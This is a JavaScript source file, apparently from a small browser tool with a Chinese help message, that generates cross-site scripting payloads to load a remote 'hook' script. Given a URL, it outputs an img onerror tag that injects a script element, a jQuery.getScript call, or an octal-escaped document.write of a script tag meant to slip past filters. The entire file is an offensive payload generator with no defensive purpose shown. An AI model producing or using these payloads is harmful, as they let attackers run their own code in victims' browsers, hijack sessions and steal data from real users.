var hook = document.getElementById("hook");
var help = document.getElementById("help");
var duoxuan = document.getElementsByTagName("input");
var shuru = document.getElementById("encode");
var shuchu = document.getElementById("decode");
var getscript = document.getElementById("getscript");
var img = document.getElementById("imgcreate");
var wuweixian = document.getElementById("wuweixian");
hook.onclick=function()
{
	var address = shuru.value.replace(/http:/,"");
	if(img.checked)
		{
			shuchu.value="<img src=x onerror=with(document).body.appendChild(createElement(/script/.source)).src=alt alt="+address+">";
		}
	else if(getscript.checked)
		{

			shuchu.value="jQuery.getScript('"+address+"');";
		}
	else if(wuweixian.checked)
	{
		var temp = "<script src="+address+"></script>";
		var jieguo = "";
		for(var i=0;i<temp.length;i++)
				{
					jieguo +="\\"+temp.charCodeAt(i).toString(8);
				}
		shuchu.value="document.write(unescape('"+jieguo+"'))";
	}
	
}
help.onclick=function()
{
	alert("本插件还不是最终版，所以功能还待完善！使用注意：变异编码，常规变异跟非常规变异只能一次二选一！\n如果你选择的html编码需要去分号的话也可以勾上！\n使用hook生成功能时也只能三选一 多选无法生成代码！\n使用hook生成的话只需要把hook js的地址放入encode处 然后勾选功能点生成即可！\n\nps:使用编码变异时别勾选hook生成！使用hook生成时别勾选代码变异")
}

